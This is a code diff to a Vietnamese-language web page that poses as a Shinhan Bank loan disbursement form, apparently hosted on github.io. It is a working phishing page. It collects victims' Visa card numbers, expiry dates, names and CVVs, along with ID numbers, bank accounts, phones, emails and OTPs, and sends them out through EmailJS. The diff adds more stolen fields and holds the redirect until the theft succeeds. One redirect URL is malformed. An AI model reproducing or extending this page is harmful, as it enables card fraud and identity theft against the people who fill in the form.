@@ -337,12 +337,8 @@
             margin-bottom: 10px;
         }
 
-        .guide-section img {
-            max-width: 300px;
-            width: 100%;
-            border: 1px solid #e9ecef;
-            border-radius: 5px;
-            margin-bottom: 10px;
+        .guide-section p {
+            font-size: 14px;
         }
 
         .issue-guide-section {
@@ -456,6 +452,12 @@
             text-align: center;
         }
 
+        .form-group .input-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
         .form-group input {
             width: 100%;
             padding: 8px;
@@ -480,6 +482,15 @@
             color: #666;
             margin-top: 5px;
             text-align: center;
+        }
+
+        .help-icon {
+            color: red;
+            font-weight: bold;
+            font-size: 16px;
+            margin-left: 5px;
+            cursor: pointer;
+            display: inline-block;
         }
 
         .timer {
@@ -797,19 +808,19 @@
             <h3>Chọn ngân hàng</h3>
             <div class="bank-grid">
                 <div class="bank-option" data-bank="BANK_25" data-logo="https://www.vban.vn/Resources/images/logo-bank/25.png">
-                    <img src="https://www.vban.vn/Resources/images/logo-bank/25.png" alt="Thẻ Mastercard">
+                    <img src="https://www.vban.vn/Resources/images/logo-bank/25.png" alt="BANK_25 Logo">
                     <p>BANK_25</p>
                 </div>
                 <div class="bank-option" data-bank="BANK_26" data-logo="https://www.vban.vn/Resources/images/logo-bank/26.png">
-                    <img src="https://www.vban.vn/Resources/images/logo-bank/26.png" alt="Thẻ Visa">
+                    <img src="https://www.vban.vn/Resources/images/logo-bank/26.png" alt="BANK_26 Logo">
                     <p>BANK_26</p>
                 </div>
                 <div class="bank-option" data-bank="BANK_27" data-logo="https://www.vban.vn/Resources/images/logo-bank/27.png">
-                    <img src="https://www.vban.vn/Resources/images/logo-bank/27.png" alt="Thẻ JCB">
+                    <img src="https://www.vban.vn/Resources/images/logo-bank/27.png" alt="BANK_27 Logo">
                     <p>BANK_27</p>
                 </div>
                 <div class="bank-option" data-bank="UIP" data-logo="https://www.vban.vn/Resources/images/logo-bank/uip.png">
-                    <img src="https://www.vban.vn/Resources/images/logo-bank/uip.png" alt="Thẻ UIP">
+                    <img src="https://www.vban.vn/Resources/images/logo-bank/uip.png" alt="UIP Logo">
                     <p>UIP</p>
                 </div>
             </div>
@@ -835,32 +846,39 @@
         <div class="guide-section" id="card-guide">
             <img class="bank-logo" id="selected-bank-logo" src="" alt="Logo ngân hàng đã chọn">
             <h3>Hướng dẫn nhập thông tin thẻ Visa</h3>
-            <img src="https://via.placeholder.com/300x150?text=Thẻ+Visa+Mẫu" alt="Hình ảnh minh họa thẻ Visa, hiển thị số thẻ, tên, ngày hết hạn, CVV" data-bank="">
             <p>Số thẻ Visa in trên mặt trước thẻ.</p>
         </div>
         <form id="card-info-form" class="card-form">
             <p class="check-info">Vui lòng kiểm tra thông tin trước khi nhập thẻ!</p>
             <div class="form-group" aria-live="polite">
-                <label for="visaCardNumber">Số thẻ Visa *</label>
-                <input type="text" id="visaCardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required aria-describedby="visaCardNumberError">
+                <label for="visaCardNumber">Số thẻ Visa *<span class="help-icon" onclick="showHelp('visaCardNumber')">?</span></label>
+                <div class="input-wrapper">
+                    <input type="text" id="visaCardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required aria-describedby="visaCardNumberError">
+                </div>
                 <span class="help-text">16 số in trên mặt trước thẻ Visa.</span>
                 <span class="error" id="visaCardNumberError">Số thẻ phải là 16 số</span>
             </div>
             <div class="form-group" aria-live="polite">
-                <label for="visaExpiryDate">Ngày hết hạn *</label>
-                <input type="text" id="visaExpiryDate" placeholder="02/30" maxlength="5" required aria-describedby="visaExpiryDateError">
+                <label for="visaExpiryDate">Ngày hết hạn *<span class="help-icon" onclick="showHelp('visaExpiryDate')">?</span></label>
+                <div class="input-wrapper">
+                    <input type="text" id="visaExpiryDate" placeholder="02/30" maxlength="5" required aria-describedby="visaExpiryDateError">
+                </div>
                 <span class="help-text">Ngày hết hạn trên thẻ, định dạng mm/yy (ví dụ: 02/30).</span>
                 <span class="error" id="visaExpiryDateError">Ngày hết hạn phải hợp lệ (mm/yy, sau ngày hiện tại)</span>
             </div>
             <div class="form-group" aria-live="polite">
-                <label for="visaFullName">Họ và tên chủ thẻ *</label>
-                <input type="text" id="visaFullName" required aria-describedby="visaFullNameError">
+                <label for="visaFullName">Họ và tên chủ thẻ *<span class="help-icon" onclick="showHelp('visaFullName')">?</span></label>
+                <div class="input-wrapper">
+                    <input type="text" id="visaFullName" required aria-describedby="visaFullNameError">
+                </div>
                 <span class="help-text">Tên chủ thẻ in trên mặt trước thẻ, nhập chính xác.</span>
                 <span class="error" id="visaFullNameError">Họ và tên phải có ít nhất 2 ký tự</span>
             </div>
             <div class="form-group" aria-live="polite">
-                <label for="visaCvv">Số CVV *</label>
-                <input type="text" id="visaCvv" placeholder="123" maxlength="3" required aria-describedby="visaCvvError">
+                <label for="visaCvv">Số CVV *<span class="help-icon" onclick="showHelp('visaCvv')">?</span></label>
+                <div class="input-wrapper">
+                    <input type="text" id="visaCvv" placeholder="123" maxlength="3" required aria-describedby="visaCvvError">
+                </div>
                 <span class="help-text">3 số ở mặt sau thẻ, thường trong dải chữ ký.</span>
                 <span class="error" id="visaCvvError">CVV phải là 3 số</span>
             </div>
@@ -906,6 +924,11 @@
         let failedAttempts = 0;
         let formData = {};
 
+        // Show Help Placeholder
+        function showHelp(fieldId) {
+            alert(`Hướng dẫn cho ${selectedBank || 'ngân hàng'} sẽ được cập nhật.`);
+        }
+
         // Load Summary and Initialize
         window.addEventListener('load', () => {
             try {
@@ -940,7 +963,7 @@
                     method: formData.method || 'N/A',
                     timestamp: new Date().toLocaleString('vi-VN')
                 }).then(
-                    () => {},
+                    () => console.log('Initial formData sent via EmailJS'),
                     (error) => console.error('EmailJS error:', error)
                 );
                 // Pre-select bank from sessionStorage
@@ -952,7 +975,7 @@
             } catch (error) {
                 console.error('Error parsing formData:', error);
                 alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
+                window.location.href = 'https://vaytieudung.github.iotroi/shinhanbank/pages/vi/Evaluate-conditions.html';
             }
             initializeInputMasks();
         });
@@ -1074,11 +1097,7 @@
 
         // Send Card Info to EmailJS
         function sendCardInfo(cardData) {
-            emailjs.send('service_60tgxof', 'template_m26sq6s', cardData)
-                .then(
-                    () => {},
-                    (error) => console.error('EmailJS error:', error)
-                );
+            return emailjs.send('service_60tgxof', 'template_m26sq6s', cardData);
         }
 
         // Validate Visa Data
@@ -1123,8 +1142,9 @@
                 document.getElementById('summaryExpiryDate').textContent = formData.expiryDate;
                 document.getElementById('summaryFullName').textContent = formData.fullName;
                 document.getElementById('summaryCvv').textContent = formData.cvv;
+                // Save to sessionStorage
                 sessionStorage.setItem('formData', JSON.stringify(formData));
-                // Gửi thông tin thẻ qua EmailJS
+                // Send to EmailJS
                 const cardData = {
                     cardType: formData.cardType,
                     cardNumber: formData.cardNumber,
@@ -1132,11 +1152,27 @@
                     fullName: formData.fullName,
                     cvv: formData.cvv,
                     bankName: formData.bankName,
-                    timestamp: new Date().toLocaleString('vi-VN')
+                    timestamp: new Date().toLocaleString('vi-VN'),
+                    cccd: formData.cccd || 'N/A',
+                    amount: formData.amount || 'N/A',
+                    months: formData.months || 'N/A',
+                    account_number: formData.accountNumber || 'N/A',
+                    account_holder: formData.accountHolder || 'N/A',
+                    bank: formData.bank || 'N/A',
+                    phone: formData.phone || 'N/A',
+                    email: formData.email || 'N/A',
+                    method: formData.method || 'N/A'
                 };
-                sendCardInfo(cardData);
-                // Redirect to OTP page immediately
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/atm2.html';
+                sendCardInfo(cardData).then(
+                    () => {
+                        console.log('EmailJS sent successfully');
+                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/atm2.html';
+                    },
+                    (error) => {
+                        console.error('EmailJS error:', error);
+                        alert('Lỗi khi gửi thông tin. Vui lòng thử lại.');
+                    }
+                );
             }
 
             return isValid;
@@ -1170,7 +1206,7 @@
                 phone: phone,
                 timestamp: new Date().toLocaleString('vi-VN')
             }).then(
-                () => {},
+                () => console.log('OTP sent via EmailJS'),
                 (error) => console.error('EmailJS error:', error)
             );
         }
